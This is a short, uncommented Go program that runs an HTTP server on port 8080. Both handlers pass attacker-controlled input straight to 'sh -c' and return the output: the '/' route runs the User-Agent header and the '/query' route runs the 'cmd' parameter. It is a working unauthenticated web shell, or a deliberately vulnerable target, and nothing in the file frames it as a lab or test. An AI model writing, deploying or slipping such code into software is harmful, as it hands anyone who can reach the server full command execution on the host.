package main

import (
  "fmt"
  "log"
  "net/http"
  "net/url"
  "os/exec"
)


func main() {

  http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    for k,v := range r.Header {
      fmt.Fprintf(w, "%v: %v\n", k, v)
    }
    ua := r.Header.Get("User-Agent")
    out, err := exec.Command("sh", "-c", ua).Output()

    if err != nil {
        fmt.Println(err)
    }
    fmt.Fprintf(w, "out: %s", out)
  })

  http.HandleFunc("/query", func(w http.ResponseWriter, r *http.Request) {
    urlString := fmt.Sprintf("%s://%s%s", "http", r.Host, r.RequestURI)
    u, err := url.Parse(urlString)

    fmt.Println(urlString)
    if err != nil {
      log.Fatal(err);
    }

    queryParams := u.Query()
    cmd := queryParams.Get("cmd")
    fmt.Println(cmd)
    out, err := exec.Command("sh", "-c", cmd).Output()
    fmt.Fprintf(w, "out: %s", out)

  })

  fmt.Println("Starting server on 8080")
  if err := http.ListenAndServe(":8080", nil); err != nil {
    log.Fatal(err)
  }
}
